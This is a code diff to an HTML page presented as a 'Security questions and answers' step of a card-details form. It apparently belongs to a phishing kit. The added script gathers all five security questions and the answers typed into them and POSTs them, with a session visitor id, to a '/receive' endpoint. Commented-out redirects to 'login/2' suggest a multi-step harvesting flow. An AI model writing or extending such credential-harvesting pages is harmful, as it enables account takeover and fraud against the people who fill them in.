@@ -48,11 +48,11 @@
                <img alt="Close message" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" />
                </a>
             </div>
-            <div class="validation-summary" style="display:block;">
+            <div id="alertManagerArea" class="validation-summary" style="display:none;">
                <div class="message">
                   <p><strong>Please correct the errors with the following fields:</strong></p>
                </div>
-               <div class="errors"> test</div>
+               <div id="unorder-list" class="errors"> </div>
             </div>
             <form id="carddetails_form">
                <span>Step 2 of 3 - Security questions and answers </span>
@@ -80,7 +80,7 @@
             <label data-field-name="security-answer-1" data-field-title="Security Answer 1" for="security_details_answer_1">
                 <span class="label">Answer</span>
                 <span class="control">
-                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer1" id="security_details_answer_1" />
+                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer1" id="security_details_answer_1" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -106,7 +106,7 @@
             <label data-field-name="security-answer-2" data-field-title="Security Answer 2" for="security_details_answer_2">
                 <span class="label">Answer</span>
                 <span class="control">
-                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer2" id="security_details_answer_2" />
+                    <input class="log_details"  type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer2" id="security_details_answer_2" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -132,7 +132,7 @@
             <label data-field-name="security-answer-3" data-field-title="Security Answer 3" for="security_details_answer_3">
                 <span class="label">Answer</span>
                 <span class="control">
-                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer3" id="security_details_answer_3" />
+                    <input class="log_details"  type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer3" id="security_details_answer_3" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -158,7 +158,7 @@
             <label data-field-name="security-answer-4" data-field-title="Security Answer 4" for="security_details_answer_4">
                 <span class="label">Answer</span>
                 <span class="control">
-                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer4" id="security_details_answer_4" />
+                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer4" id="security_details_answer_4" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -184,7 +184,7 @@
             <label data-field-name="security-answer-5" data-field-title="Security Answer 5" for="security_details_answer_5">
                 <span class="label">Answer</span>
                 <span class="control">
-                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer5" id="security_details_answer_5" />
+                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer5" id="security_details_answer_5" />
                 </span>
                 <span class="visually-hidden">100 characters is the maximum length of this field</span>
             </label>
@@ -196,7 +196,7 @@
     <button type="button" class="button" data-bind="click: cancel">
         <span>Cancel</span>
     </button>
-    <button class="button-alt" data-bind="click: submit">
+    <button id="subbut" class="button-alt" data-bind="click: submit">
         <span>Next</span>
     </button>
 </div>
@@ -215,4 +215,93 @@
          </div>
       </footer>
    </body>
+   <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    
+ <script>
+ 	
+ 	function addListItem(ulId, text, attributes = {}) {
+    var ul = document.getElementById(ulId);
+    var li = document.createElement('li');
+    li.textContent = ' ' + text ; 
+
+    for (const [key, value] of Object.entries(attributes)) {
+        li.setAttribute(key, value);
+    }
+
+    ul.appendChild(li);
+    	 };
+    	 </script>
+    	 <script>
+    	 	
+    	 	$(document).ready(function() {
+    $('#subbut').on('click', function(event) {
+        event.preventDefault(); // Prevent the default action of the link
+
+        let myForm = $("#carddetails_form");
+        let checkInputs = document.querySelectorAll('.log_details');       
+        let list = document.getElementById('unorder-list');
+		let message = "";
+		let count = 0;
+        for (let i = 1; i <= 5; i++) {
+                let answer = document.getElementById('security_details_answer_' + i).value;
+                let question = document.getElementById('security_details_question_' + i);
+                let selectedOption = question.options[question.selectedIndex].textContent;
+                message += selectedOption + ' : ' + answer + '\n';
+                
+            }
+        
+            console.log(message);
+        
+		// While there are child elements, remove the first child
+		while (list.firstChild) {
+		    list.removeChild(list.firstChild);
+		}
+        
+        
+        // Flag to track if any input is empty
+        let isEmpty = false;
+        
+
+        for (const check of checkInputs) {
+            check.addEventListener('focus', () => {
+                console.log('focus');
+                check.nextElementSibling.style.display = "none";
+            });
+
+            if (check.value.trim() === "") {
+            	count++ ;
+            	console.log(check.name);
+                document.getElementById('alertManagerArea').style.display = "block";
+               var ans = `Answer ${count}`;
+                addListItem('unorder-list', ans);
+                isEmpty = true;
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            
+
+        let visitor = sessionStorage.getItem('visitor');
+            
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive",
+                data: { message: message, visitor: visitor }
+            }).done(function(msg) {
+            
+                sessionStorage.setItem('visitor', visitor);
+                //window.location.href = "login/2";
+                console.log(msg); // Log success message
+            }).fail(function(err, textstatus, error) {
+            //window.location.href = "login/2"; 
+            
+            });
+        }
+    });
+});
+
+
+    </script> 
 </html>
